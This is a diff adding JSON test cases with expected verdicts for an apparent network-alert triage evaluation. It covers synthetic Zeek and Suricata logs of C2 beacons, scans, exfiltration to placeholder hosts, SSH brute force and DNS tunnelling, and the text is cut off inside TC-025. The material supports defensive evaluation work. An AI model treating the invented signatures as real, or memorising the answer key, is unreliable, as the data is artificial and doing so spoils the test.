@@ -1,0 +1,1104 @@
+{
+  "test_cases": [
+    {
+      "id": "TC-001",
+      "scenario": "C2 Beacon",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Regular 60s beacon interval to known malicious IP, confirmed by both Zeek and Suricata CobaltStrike signature",
+      "input": {
+        "zeek": "1743900000.000000 CBeacon1 192.168.1.105 49832 185.220.101.45 80 tcp http 320.451823 512 98304 SF T T 0 ShADadfFr 8 1024 6 99328\n1743900060.000000 CBeacon2 192.168.1.105 49833 185.220.101.45 80 tcp http 319.887432 498 97856 SF T T 0 ShADadfFr 8 1024 6 99072\n1743900120.000000 CBeacon3 192.168.1.105 49901 185.220.101.45 80 tcp http 318.992341 501 98100 SF T T 0 ShADadfFr 8 1024 6 99200\n1743900180.000000 CBeacon4 192.168.1.105 49950 185.220.101.45 80 tcp http 320.112233 499 98050 SF T T 0 ShADadfFr 8 1024 6 99150\n1743900240.000000 CBeacon5 192.168.1.105 50001 185.220.101.45 80 tcp http 319.654321 503 98200 SF T T 0 ShADadfFr 8 1024 6 99300",
+        "suricata": "[1:2025901:3] ET MALWARE Win32/CobaltStrike Beacon [Priority: 1] 2026-04-05T12:00:00 192.168.1.105:49832 -> 185.220.101.45:80 TCP\n[1:2025901:3] ET MALWARE Win32/CobaltStrike Beacon [Priority: 1] 2026-04-05T12:01:00 192.168.1.105:49833 -> 185.220.101.45:80 TCP\n[1:2025901:3] ET MALWARE Win32/CobaltStrike Beacon [Priority: 1] 2026-04-05T12:02:00 192.168.1.105:49901 -> 185.220.101.45:80 TCP"
+      }
+    },
+    {
+      "id": "TC-002",
+      "scenario": "C2 Beacon",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "DNS tunneling C2 with base64 encoded data to known C2 domain, confirmed by both sources",
+      "input": {
+        "zeek": "1743900000.000000 CDNS1 192.168.1.88 53412 8.8.8.8 53 udp dns 0.123 180 320 SF - - 0 Dd 2 236 2 376\n1743900030.000000 CDNS2 192.168.1.88 53413 8.8.8.8 53 udp dns 0.098 176 318 SF - - 0 Dd 2 232 2 374\n1743900060.000000 CDNS3 192.168.1.88 53414 8.8.8.8 53 udp dns 0.115 182 322 SF - - 0 Dd 2 238 2 378\ndns.log: query=c2data.aGVsbG8gd29ybGQ.evil-c2.com type=TXT\ndns.log: query=exfil.dGhpcyBpcyBhIHRlc3Q.evil-c2.com type=TXT\ndns.log: query=beacon.aW1wb3J0YW50IGRhdGE.evil-c2.com type=TXT",
+        "suricata": "[1:2027758:2] ET TROJAN DNS Query for Known C2 Domain evil-c2.com [Priority: 1] 2026-04-05T12:00:00 192.168.1.88:53412 -> 8.8.8.8:53 UDP\n[1:2013926:5] ET POLICY DNS TXT Record with Base64 Encoded Data [Priority: 2] 2026-04-05T12:00:30 192.168.1.88:53413 -> 8.8.8.8:53 UDP\n[1:2027758:2] ET TROJAN DNS Query for Known C2 Domain evil-c2.com [Priority: 1] 2026-04-05T12:01:00 192.168.1.88:53414 -> 8.8.8.8:53 UDP"
+      }
+    },
+    {
+      "id": "TC-003",
+      "scenario": "C2 Beacon",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Exactly 600s beacon interval over SSL with suspicious cert and known malicious JA3",
+      "input": {
+        "zeek": "1743900000.000000 CHTTP1 10.0.0.55 44231 203.0.113.99 443 tcp ssl 600.000001 1024 2048 SF T T 0 ShADadfFr 10 1280 8 2304\n1743900600.000000 CHTTP2 10.0.0.55 44232 203.0.113.99 443 tcp ssl 599.999998 1022 2046 SF T T 0 ShADadfFr 10 1278 8 2302\n1743901200.000000 CHTTP3 10.0.0.55 44233 203.0.113.99 443 tcp ssl 600.000003 1025 2049 SF T T 0 ShADadfFr 10 1281 8 2305\nssl.log: server_name=windowsupdate-cdn.net ja3=a0e9f5d64349fb13191bc781f81f42e1",
+        "suricata": "[1:2024897:3] ET MALWARE Suspicious SSL Cert (Known Malware C2) [Priority: 1] 2026-04-05T12:00:00 10.0.0.55:44231 -> 203.0.113.99:443 TCP\n[1:2028765:1] ET JA3 Known Malicious JA3 Fingerprint a0e9f5d64349fb13191bc781f81f42e1 [Priority: 2] 2026-04-05T12:10:00 10.0.0.55:44232 -> 203.0.113.99:443 TCP"
+      }
+    },
+    {
+      "id": "TC-004",
+      "scenario": "C2 Beacon",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Metasploit Meterpreter reverse shell beaconing every 30s to attacker IP on non-standard port, both sources confirm",
+      "input": {
+        "zeek": "1743900000.000000 CMeter1 192.168.1.77 50123 45.76.100.22 4444 tcp - 30.001 2048 4096 SF T T 0 ShADadfFr 12 2304 18 4352\n1743900030.000000 CMeter2 192.168.1.77 50124 45.76.100.22 4444 tcp - 29.998 2050 4094 SF T T 0 ShADadfFr 12 2306 18 4350\n1743900060.000000 CMeter3 192.168.1.77 50125 45.76.100.22 4444 tcp - 30.002 2047 4097 SF T T 0 ShADadfFr 12 2303 18 4353\nconn.log: 192.168.1.77 -> 45.76.100.22:4444 interval=30s encrypted=true bidirectional=true",
+        "suricata": "[1:2025032:4] ET MALWARE Meterpreter Reverse Shell Activity [Priority: 1] 2026-04-05T12:00:00 192.168.1.77:50123 -> 45.76.100.22:4444 TCP\n[1:2025033:2] ET MALWARE Metasploit Payload Detected [Priority: 1] 2026-04-05T12:00:30 192.168.1.77:50124 -> 45.76.100.22:4444 TCP\n[1:2025034:1] ET MALWARE C2 Beaconing Non-Standard Port 4444 [Priority: 1] 2026-04-05T12:01:00 192.168.1.77:50125 -> 45.76.100.22:4444 TCP"
+      }
+    },
+    {
+      "id": "TC-005",
+      "scenario": "C2 Beacon",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Sliver C2 implant using HTTPS with domain fronting via CDN, periodic check-ins every 120s",
+      "input": {
+        "zeek": "1743900000.000000 CSliver1 10.0.0.88 51001 104.21.44.100 443 tcp ssl 120.000 1536 3072 SF T T 0 ShADadfFr 8 1792 14 3328\n1743900120.000000 CSliver2 10.0.0.88 51002 104.21.44.100 443 tcp ssl 119.997 1534 3070 SF T T 0 ShADadfFr 8 1790 14 3326\n1743900240.000000 CSliver3 10.0.0.88 51003 104.21.44.100 443 tcp ssl 120.003 1537 3073 SF T T 0 ShADadfFr 8 1793 14 3329\nssl.log: server_name=cdn-assets-delivery.net ja3=51c64c77e60f3980eea90869b68c58a8 cert_age_days=3\nhttp.log: host=cdn-assets-delivery.net uri=/api/v1/update method=POST",
+        "suricata": "[1:2029400:2] ET MALWARE Sliver C2 Framework HTTPS Beacon [Priority: 1] 2026-04-05T12:00:00 10.0.0.88:51001 -> 104.21.44.100:443 TCP\n[1:2029401:1] ET MALWARE Domain Fronting C2 CDN Pattern [Priority: 2] 2026-04-05T12:02:00 10.0.0.88:51002 -> 104.21.44.100:443 TCP\n[1:2029402:1] ET MALWARE Newly Registered Domain C2 cert_age=3d [Priority: 2] 2026-04-05T12:04:00 10.0.0.88:51003 -> 104.21.44.100:443 TCP"
+      }
+    },
+    {
+      "id": "TC-006",
+      "scenario": "Port Scan",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "External IP scanning 65535 ports in 2 seconds with Nmap signatures confirmed by both sources",
+      "input": {
+        "zeek": "1743900000.000000 CScan1 45.33.32.156 54231 192.168.1.1 22 tcp - 0.000031 0 0 REJ F F 0 Sr 1 40 0 0\n1743900000.001000 CScan2 45.33.32.156 54232 192.168.1.1 23 tcp - 0.000028 0 0 REJ F F 0 Sr 1 40 0 0\n1743900000.002000 CScan3 45.33.32.156 54233 192.168.1.1 80 tcp - 0.000033 0 0 REJ F F 0 Sr 1 40 0 0\n[... 200 more rejected connections across ports 1-65535 within 2 seconds]\nconn.log: 45.33.32.156 -> 192.168.1.1 rejected_ports=65535 duration=2s",
+        "suricata": "[1:2010935:2] ET SCAN Nmap Scripting Engine User-Agent [Priority: 2] 2026-04-05T12:00:00 45.33.32.156 -> 192.168.1.1\n[1:2002910:6] ET SCAN Nmap SYN Scan detected [Priority: 2] 2026-04-05T12:00:00 45.33.32.156 -> 192.168.1.0/24\n[1:2000537:8] ET SCAN NMAP -sS window 1024 [Priority: 2] 2026-04-05T12:00:01 45.33.32.156 -> 192.168.1.1"
+      }
+    },
+    {
+      "id": "TC-007",
+      "scenario": "Port Scan",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "Internal host scanning common service ports \u2014 both sources confirm, Medium severity due to internal origin",
+      "input": {
+        "zeek": "1743900000.000000 CSvc1 192.168.1.200 61001 192.168.1.1 22 tcp ssh 0.452 0 0 S0 F F 0 S 1 40 0 0\n1743900005.000000 CSvc2 192.168.1.200 61002 192.168.1.1 80 tcp http 0.321 0 0 S0 F F 0 S 1 40 0 0\n1743900010.000000 CSvc3 192.168.1.200 61003 192.168.1.1 443 tcp ssl 0.289 0 0 S0 F F 0 S 1 40 0 0\n1743900015.000000 CSvc4 192.168.1.200 61004 192.168.1.1 3306 tcp - 0.012 0 0 REJ F F 0 Sr 1 40 0 0\n1743900020.000000 CSvc5 192.168.1.200 61005 192.168.1.1 5432 tcp - 0.011 0 0 REJ F F 0 Sr 1 40 0 0\n1743900025.000000 CSvc6 192.168.1.200 61006 192.168.1.1 6379 tcp - 0.010 0 0 REJ F F 0 Sr 1 40 0 0",
+        "suricata": "[1:2019236:2] ET SCAN Possible Horizontal Port Scan [Priority: 3] 2026-04-05T12:00:00 192.168.1.200 -> 192.168.1.1\n[1:2010766:3] ET SCAN Rapid Port Scan Activity [Priority: 3] 2026-04-05T12:00:25 192.168.1.200 -> 192.168.1.1"
+      }
+    },
+    {
+      "id": "TC-008",
+      "scenario": "Port Scan",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Entire subnet SMB sweep matching EternalBlue pattern, lateral movement risk, confirmed by both sources",
+      "input": {
+        "zeek": "1743900000.000000 CNetScan1 172.16.0.5 45000 192.168.1.1 445 tcp - 0.000025 0 0 REJ F F 0 Sr 1 40 0 0\n1743900000.100000 CNetScan2 172.16.0.5 45001 192.168.1.2 445 tcp - 0.000023 0 0 REJ F F 0 Sr 1 40 0 0\n[... scanning entire 192.168.1.0/24 subnet on port 445 within 30 seconds]\n1743900030.000000 CNetScan255 172.16.0.5 45254 192.168.1.254 445 tcp - 0.000026 0 0 REJ F F 0 Sr 1 40 0 0",
+        "suricata": "[1:2009582:5] ET SCAN SMB Network Scan Detected [Priority: 1] 2026-04-05T12:00:00 172.16.0.5 -> 192.168.1.0/24\n[1:2010935:2] ET SCAN Horizontal Sweep SMB Port 445 [Priority: 1] 2026-04-05T12:00:15 172.16.0.5 -> 192.168.1.0/24\n[1:2001219:18] ET SCAN Potential SMB Exploit Scan EternalBlue [Priority: 1] 2026-04-05T12:00:20 172.16.0.5 -> 192.168.1.0/24"
+      }
+    },
+    {
+      "id": "TC-009",
+      "scenario": "Port Scan",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Masscan-style ultra-fast port scan at 1M pps from external IP targeting entire /16 subnet",
+      "input": {
+        "zeek": "1743900000.000000 CMass1 198.51.100.5 0 10.0.0.1 80 tcp - 0.000001 0 0 S0 F F 0 S 1 40 0 0\n1743900000.000001 CMass2 198.51.100.5 0 10.0.0.2 80 tcp - 0.000001 0 0 S0 F F 0 S 1 40 0 0\n[... 1000000 SYN packets to 10.0.0.0/16 within 60 seconds, all S0 state]\nconn.log: 198.51.100.5 -> 10.0.0.0/16 pps=16666 unique_dst_ips=65536 scan_tool=masscan",
+        "suricata": "[1:2010937:3] ET SCAN Masscan Tool Detected [Priority: 1] 2026-04-05T12:00:00 198.51.100.5 -> 10.0.0.0/16\n[1:2010938:2] ET SCAN Ultra-High Rate Port Scan 1Mpps [Priority: 1] 2026-04-05T12:00:10 198.51.100.5 -> 10.0.0.0/16\n[1:2010939:1] ET SCAN Large Subnet Reconnaissance [Priority: 1] 2026-04-05T12:00:30 198.51.100.5 -> 10.0.0.0/16"
+      }
+    },
+    {
+      "id": "TC-010",
+      "scenario": "Port Scan",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "Slow stealthy scan using decoy IPs to evade detection \u2014 Nmap -D flag pattern, low rate over 10 minutes",
+      "input": {
+        "zeek": "1743900000.000000 CDecoy1 203.0.113.10 54001 192.168.1.50 22 tcp - 0.000030 0 0 REJ F F 0 Sr 1 40 0 0\n1743900060.000000 CDecoy2 203.0.113.11 54002 192.168.1.50 80 tcp - 0.000028 0 0 REJ F F 0 Sr 1 40 0 0\n1743900120.000000 CDecoy3 203.0.113.12 54003 192.168.1.50 443 tcp - 0.000029 0 0 REJ F F 0 Sr 1 40 0 0\n[... 1 probe/min from 20 rotating decoy IPs all targeting 192.168.1.50]\nconn.log: target=192.168.1.50 decoy_ips=20 unique_src_ips=20 rate=1probe/min pattern=sequential_ports",
+        "suricata": "[1:2010940:2] ET SCAN Nmap Decoy Scan Pattern Detected [Priority: 2] 2026-04-05T12:00:00 203.0.113.10 -> 192.168.1.50\n[1:2010941:1] ET SCAN Coordinated Multi-Source Port Probe [Priority: 2] 2026-04-05T12:02:00 multiple -> 192.168.1.50\n[1:2010942:1] ET SCAN Sequential Port Enumeration Slow Rate [Priority: 3] 2026-04-05T12:05:00 multiple -> 192.168.1.50"
+      }
+    },
+    {
+      "id": "TC-011",
+      "scenario": "Data Exfiltration",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "50MB+ database dump transferred to known APT infrastructure confirmed by both Zeek files.log and Suricata",
+      "input": {
+        "zeek": "1743900000.000000 CExfil1 192.168.1.150 52341 91.108.4.100 443 tcp ssl 180.234512 52428800 98304 SF T T 0 ShADadfFr 40 52429856 8 99328\n1743903600.000000 CExfil2 192.168.1.150 52342 91.108.4.100 443 tcp ssl 175.445231 48234496 87040 SF T T 0 ShADadfFr 38 48235552 7 88064\nfiles.log: filename=employee_database.zip mime=application/zip size=52428800 tx_hosts=192.168.1.150 rx_hosts=91.108.4.100",
+        "suricata": "[1:2023476:3] ET POLICY Outbound Large File Transfer over SSL [Priority: 2] 2026-04-05T12:00:00 192.168.1.150:52341 -> 91.108.4.100:443 TCP\n[1:2030123:1] ET MALWARE Data Exfiltration to Known APT Infrastructure [Priority: 1] 2026-04-05T12:00:00 192.168.1.150:52341 -> 91.108.4.100:443 TCP\n[1:2025696:2] ET POLICY File Transfer zip via SSL to External IP [Priority: 2] 2026-04-05T13:00:00 192.168.1.150:52342 -> 91.108.4.100:443 TCP"
+      }
+    },
+    {
+      "id": "TC-012",
+      "scenario": "Data Exfiltration",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Anonymous FTP upload of financial file to external host confirmed by both sources",
+      "input": {
+        "zeek": "1743900000.000000 CFTP1 10.0.0.88 55123 185.199.108.153 21 tcp ftp 45.231 2048 10485760 SF T T 0 ShADadfFr 20 2304 80 10486784\nftp.log: command=STOR arg=financials_Q1_2026.xlsx size=10485760 user=anonymous",
+        "suricata": "[1:2003161:6] ET POLICY FTP Anonymous Login [Priority: 3] 2026-04-05T12:00:00 10.0.0.88:55123 -> 185.199.108.153:21 TCP\n[1:2023456:2] ET POLICY Large File Upload via FTP [Priority: 2] 2026-04-05T12:00:15 10.0.0.88:55123 -> 185.199.108.153:21 TCP\n[1:2025123:1] ET MALWARE Suspected Insider Threat FTP Exfiltration Pattern [Priority: 1] 2026-04-05T12:00:45 10.0.0.88:55123 -> 185.199.108.153:21 TCP"
+      }
+    },
+    {
+      "id": "TC-013",
+      "scenario": "Data Exfiltration",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "DNS TXT exfiltration with base64 chunks confirmed by both Zeek dns.log and Suricata",
+      "input": {
+        "zeek": "1743900000.000000 CDNS_Exfil1 192.168.1.77 54891 8.8.8.8 53 udp dns 0.089 320 128 SF - - 0 Dd 2 376 2 184\n1743900002.000000 CDNS_Exfil2 192.168.1.77 54892 8.8.8.8 53 udp dns 0.091 318 126 SF - - 0 Dd 2 374 2 182\ndns.log: query=dGhpcyBpcyBzZWNyZXQgZGF0YSBjaHVuazE.exfil-domain.xyz TXT\ndns.log: query=aW1wb3J0YW50IGZpbGUgY2h1bmsyIGhlcmU.exfil-domain.xyz TXT",
+        "suricata": "[1:2025887:1] ET TROJAN Possible DNS Tunneling/Exfiltration Activity [Priority: 2] 2026-04-05T12:00:02 192.168.1.77 -> 8.8.8.8\n[1:2025888:1] ET TROJAN High Rate DNS TXT Queries Possible Exfil [Priority: 2] 2026-04-05T12:00:04 192.168.1.77 -> 8.8.8.8"
+      }
+    },
+    {
+      "id": "TC-014",
+      "scenario": "Data Exfiltration",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Insider threat uploading full customer database to personal Google Drive before resignation",
+      "input": {
+        "zeek": "1743900000.000000 CINS1 192.168.1.75 54701 52.239.177.99 443 tcp ssl 234.123 104857600 524288 SF T T 0 ShADadfFr 85 104858624 5 525312\nssl.log: server_name=drive.google.com cert_valid=true\nfiles.log: filename=customer_database_full_dump.sql.gz size=104857600 mime=application/gzip tx_hosts=192.168.1.75\nconn.log: 192.168.1.75 upload_bytes_today=1073741824 upload_bytes_30day_avg=10240000 anomaly_ratio=104x",
+        "suricata": "[1:2102200:3] ET POLICY Large File Upload to Cloud Storage [Priority: 2] 2026-04-05T12:00:00 192.168.1.75 -> 52.239.177.99:443\n[1:2102201:2] ET POLICY Database Dump File Upload Detected [Priority: 1] 2026-04-05T12:00:01 192.168.1.75 -> 52.239.177.99:443\n[1:2102202:1] ET POLICY Anomalous Upload Volume Insider Threat Indicator [Priority: 1] 2026-04-05T12:00:10 192.168.1.75 -> 52.239.177.99:443"
+      }
+    },
+    {
+      "id": "TC-015",
+      "scenario": "Data Exfiltration",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Staged exfiltration via HTTPS to newly registered domain \u2014 attacker collecting and sending compressed archive",
+      "input": {
+        "zeek": "1743900000.000000 CSTAGE1 192.168.1.110 54801 91.108.56.100 443 tcp ssl 45.234 209715200 1024 SF T T 0 ShADadfFr 170 209716224 5 2048\nssl.log: server_name=cdn-delivery-network.xyz cert_issued=2026-04-04 cert_age_days=1\nfiles.log: filename=archive.tar.gz size=209715200 mime=application/gzip\nconn.log: first_seen_dst=2026-04-04 dst_asn=AS999999_bulletproof",
+        "suricata": "[1:2102203:3] ET MALWARE Post-Compromise Exfiltration to Bulletproof Hosting [Priority: 1] 2026-04-05T12:00:00 192.168.1.110 -> 91.108.56.100:443\n[1:2102204:2] ET POLICY Upload to Newly Registered Domain [Priority: 1] 2026-04-05T12:00:01 192.168.1.110 -> 91.108.56.100:443\n[1:2102205:1] ET MALWARE Known APT Exfiltration Infrastructure [Priority: 1] 2026-04-05T12:00:05 192.168.1.110 -> 91.108.56.100:443"
+      }
+    },
+    {
+      "id": "TC-016",
+      "scenario": "Brute Force SSH",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "100 failed SSH attempts in 3 minutes from external IP confirmed by both sources",
+      "input": {
+        "zeek": "1743900000.000000 CSSH1 203.0.113.10 44001 192.168.1.10 22 tcp ssh 1.234 1024 512 SF T T 0 ShADadfFr 6 1280 5 768\n1743900002.000000 CSSH2 203.0.113.10 44002 192.168.1.10 22 tcp ssh 1.189 1022 510 SF T T 0 ShADadfFr 6 1278 5 766\n[... 98 more failed SSH auth attempts within 3 minutes]\nssh.log: 100 auth_attempts client=203.0.113.10 auth_success=false",
+        "suricata": "[1:2001219:18] ET SCAN SSH BruteForce Attack [Priority: 2] 2026-04-05T12:00:00 203.0.113.10:44001 -> 192.168.1.10:22 TCP\n[1:2019876:3] ET BRUTE SSH Login Brute Force Attempt [Priority: 2] 2026-04-05T12:00:10 203.0.113.10 -> 192.168.1.10:22\n[1:2019877:3] ET BRUTE SSH Brute Force 100+ attempts [Priority: 1] 2026-04-05T12:03:00 203.0.113.10 -> 192.168.1.10:22"
+      }
+    },
+    {
+      "id": "TC-017",
+      "scenario": "Brute Force SSH",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Successful root login after 200 brute force attempts \u2014 active compromise confirmed",
+      "input": {
+        "zeek": "1743900000.000000 CSSH_OK 203.0.113.10 44501 192.168.1.10 22 tcp ssh 8.234 4096 2048 SF T T 0 ShADadfFr 15 4352 12 2304\nssh.log: 200 auth_attempts client=203.0.113.10 auth_success=true user=root login_time=2026-04-05T12:05:00\nnotice.log: SSH::Password_Guessing src=203.0.113.10 dst=192.168.1.10 num_attempts=200",
+        "suricata": "[1:2001219:18] ET SCAN SSH BruteForce Attack [Priority: 2] 2026-04-05T12:00:00 203.0.113.10 -> 192.168.1.10:22\n[1:2019877:3] ET BRUTE SSH Brute Force Successful Login After 200 Attempts [Priority: 1] 2026-04-05T12:05:00 203.0.113.10:44501 -> 192.168.1.10:22\n[1:2029321:1] ET EXPLOIT Successful SSH Login from Known Brute Force IP [Priority: 1] 2026-04-05T12:05:08 203.0.113.10 -> 192.168.1.10"
+      }
+    },
+    {
+      "id": "TC-018",
+      "scenario": "Brute Force SSH",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "Slow SSH brute force every 5 minutes evading rate limits \u2014 still malicious, Medium severity due to low velocity",
+      "input": {
+        "zeek": "1743900000.000000 CSSH_Slow1 198.51.100.5 43001 192.168.1.20 22 tcp ssh 2.341 1024 512 SF T T 0 ShADadfFr 6 1280 5 768\n1743900300.000000 CSSH_Slow2 198.51.100.5 43002 192.168.1.20 22 tcp ssh 2.289 1022 510 SF T T 0 ShADadfFr 6 1278 5 766\n1743900600.000000 CSSH_Slow3 198.51.100.5 43003 192.168.1.20 22 tcp ssh 2.301 1025 513 SF T T 0 ShADadfFr 6 1281 5 769\nssh.log: 3 auth_attempts client=198.51.100.5 auth_success=false interval=300s",
+        "suricata": "[1:2019234:2] ET SCAN SSH Login Attempt [Priority: 3] 2026-04-05T12:00:00 198.51.100.5:43001 -> 192.168.1.20:22\n[1:2019234:2] ET SCAN SSH Login Attempt [Priority: 3] 2026-04-05T12:05:00 198.51.100.5:43002 -> 192.168.1.20:22\n[1:2019234:2] ET SCAN SSH Login Attempt [Priority: 3] 2026-04-05T12:10:00 198.51.100.5:43003 -> 192.168.1.20:22"
+      }
+    },
+    {
+      "id": "TC-019",
+      "scenario": "Brute Force SSH",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Distributed SSH brute force from 50 IPs \u2014 successful login followed by immediate privilege escalation",
+      "input": {
+        "zeek": "1743900000.000000 CDistSSH1 45.33.32.10 44001 192.168.1.30 22 tcp ssh 1.123 1024 512 SF T T 0 ShADadfFr 6 1280 5 768\n1743900000.500000 CDistSSH2 45.33.32.11 44002 192.168.1.30 22 tcp ssh 1.098 1022 510 SF T T 0 ShADadfFr 6 1278 5 766\n[... 500 attempts from 50 unique IPs within 5 minutes]\nssh.log: total_attempts=500 unique_src_ips=50 auth_success=true user=ubuntu src=45.33.32.33\nconn.log: post_login 192.168.1.30 -> 45.33.32.33:9999 reverse_shell_pattern=true",
+        "suricata": "[1:2019877:3] ET BRUTE Distributed SSH Brute Force [Priority: 1] 2026-04-05T12:00:00 multiple -> 192.168.1.30:22\n[1:2029321:1] ET EXPLOIT SSH Successful Login After Distributed BF [Priority: 1] 2026-04-05T12:05:00 45.33.32.33 -> 192.168.1.30:22\n[1:2025032:1] ET MALWARE Reverse Shell After SSH Compromise [Priority: 1] 2026-04-05T12:05:30 192.168.1.30 -> 45.33.32.33:9999"
+      }
+    },
+    {
+      "id": "TC-020",
+      "scenario": "Brute Force SSH",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "SSH credential stuffing using leaked credentials list \u2014 50 targeted username/password pairs in 2 minutes",
+      "input": {
+        "zeek": "1743900000.000000 CStuff1 91.108.4.20 44101 192.168.1.40 22 tcp ssh 1.456 1024 512 SF T T 0 ShADadfFr 6 1280 5 768\n1743900002.400000 CStuff2 91.108.4.20 44102 192.168.1.40 22 tcp ssh 1.234 1022 510 SF T T 0 ShADadfFr 6 1278 5 766\n[... 50 attempts with known breached credential pairs]\nssh.log: 50 auth_attempts src=91.108.4.20 auth_success=false credential_pairs=known_breach_list",
+        "suricata": "[1:2019876:3] ET BRUTE SSH Credential Stuffing Pattern [Priority: 1] 2026-04-05T12:00:00 91.108.4.20 -> 192.168.1.40:22\n[1:2019878:2] ET BRUTE Known Breached Credentials SSH [Priority: 1] 2026-04-05T12:00:30 91.108.4.20 -> 192.168.1.40:22\n[1:2019879:1] ET BRUTE SSH Stuffing Tool Pattern [Priority: 2] 2026-04-05T12:01:00 91.108.4.20 -> 192.168.1.40:22"
+      }
+    },
+    {
+      "id": "TC-021",
+      "scenario": "DNS Tunneling",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "500 DNS TXT queries/min with base64 subdomains to known tunnel domain \u2014 active C2 channel confirmed",
+      "input": {
+        "zeek": "dns.log: 2026-04-05T12:00:00 query=aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3QgcGF5bG9hZA.tunnel.attacker.io TXT rcode=NOERROR\ndns.log: 2026-04-05T12:00:01 query=c2Vjb25kIGNodW5rIG9mIGRhdGEgYmVpbmcgZXhmaWx0cmF0ZWQ.tunnel.attacker.io TXT rcode=NOERROR\n1743900000.000000 CDNSTun 192.168.1.99 55001 8.8.8.8 53 udp dns - - - - 500 queries in 60 seconds to tunnel.attacker.io",
+        "suricata": "[1:2025887:1] ET TROJAN DNS Tunneling Activity - Iodine/DNScat Pattern [Priority: 1] 2026-04-05T12:00:00 192.168.1.99 -> 8.8.8.8\n[1:2025889:1] ET TROJAN DNS Tunnel Detected Entropy Analysis [Priority: 1] 2026-04-05T12:00:30 192.168.1.99 -> 8.8.8.8"
+      }
+    },
+    {
+      "id": "TC-022",
+      "scenario": "DNS Tunneling",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "Hex-encoded high-entropy subdomains at 1800 queries/min \u2014 confirmed DNS tunnel C2 channel",
+      "input": {
+        "zeek": "dns.log: 2026-04-05T12:00:00 src=10.0.0.44 query=01f3a4b2c5d6e7f809aabbccdd.data.covertchannel.net A\ndns.log: 2026-04-05T12:00:01 src=10.0.0.44 query=02e4b5c6d7e8f90a1bbbccdde.data.covertchannel.net A\n1743900000.000000 CDNSTun2 10.0.0.44 55100 8.8.8.8 53 udp dns - 1800 queries in 60s avg_subdomain_entropy=4.8",
+        "suricata": "[1:2025887:1] ET TROJAN DNS Tunneling High Entropy Subdomain [Priority: 1] 2026-04-05T12:00:00 10.0.0.44 -> 8.8.8.8\n[1:2025890:1] ET TROJAN Hex Encoded DNS Subdomain C2 Pattern [Priority: 1] 2026-04-05T12:00:01 10.0.0.44 -> 8.8.8.8\n[1:2013504:5] ET DNS Non-DNS Traffic on DNS Port [Priority: 2] 2026-04-05T12:00:30 10.0.0.44 -> 8.8.8.8"
+      }
+    },
+    {
+      "id": "TC-023",
+      "scenario": "DNS Tunneling",
+      "expected_verdict": "malicious",
+      "expected_severity": "Medium",
+      "rationale": "Long subdomain queries with high NXDOMAIN rate matching DGA pattern \u2014 Medium severity, no confirmed data transfer",
+      "input": {
+        "zeek": "dns.log: 2026-04-05T12:00:00 src=192.168.1.55 query=longsubdomainname123456789abcdef.suspicious-domain.xyz A rcode=NXDOMAIN\ndns.log: 2026-04-05T12:00:05 src=192.168.1.55 query=anotherlongsubdomain987654321fedcba.suspicious-domain.xyz A rcode=NXDOMAIN\n1743900000.000000 CDNSSusp 192.168.1.55 55200 8.8.8.8 53 udp dns - 45 NXDOMAIN responses in 60s",
+        "suricata": "[1:2021774:2] ET POLICY DNS Long Subdomain Query [Priority: 3] 2026-04-05T12:00:00 192.168.1.55 -> 8.8.8.8\n[1:2025891:1] ET SCAN High Rate NXDOMAIN Responses Possible DGA [Priority: 2] 2026-04-05T12:00:10 192.168.1.55 -> 8.8.8.8"
+      }
+    },
+    {
+      "id": "TC-024",
+      "scenario": "DNS Tunneling",
+      "expected_verdict": "malicious",
+      "expected_severity": "Critical",
+      "rationale": "Iodine DNS tunnel \u2014 bidirectional IP-over-DNS confirmed, attacker has full network access through tunnel",
+      "input": {
+        "zeek": "1743900000.000000 CIodine 192.168.1.66 55300 8.8.8.8 53 udp dns - 3600 queries in 3600s avg_size=512 bidirectional=true\ndns.log: query=t.tunnel.iodine-c2.net NULL rcode=NOERROR answer_size=512\ndns.log: query=y1234.tunnel.iodine-c2.net NULL rcode=NOERROR\ndns.log: query=z5678.tunnel.iodine-c2.net A rcode=NOERROR\nconn.log: 192.168.1.66 tunnel_bytes_out=10485760 tunnel_bytes_in=52428800 session_duration=3600s",
+        "suricata": "[1:2025892:3] ET TROJAN Iodine DNS Tunnel Tool Detected [Priority: 1] 2026-04-05T12:00:00 192.168.1.66 -> 8.8.8.8\n[1:2025893:2] ET TROJAN IP-Over-DNS Bidirectional Tunnel Confirmed [Priority: 1] 2026-04-05T12:00:05 192.168.1.66 -> 8.8.8.8\n[1:2025894:1] ET TROJAN Full Network Access via DNS Tunnel [Priority: 1] 2026-04-05T12:01:00 192.168.1.66 -> 8.8.8.8"
+      }
+    },
+    {
+      "id": "TC-025",
+      "scenario": "DNS Tunneling",
+      "expected_verdict": "malicious",
+      "expected_severity": "High",
+      "rationale": "DNScat2 C2 channel \u2014 command execution over DNS confirmed, attacker issuing shell commands",
+      "input": {
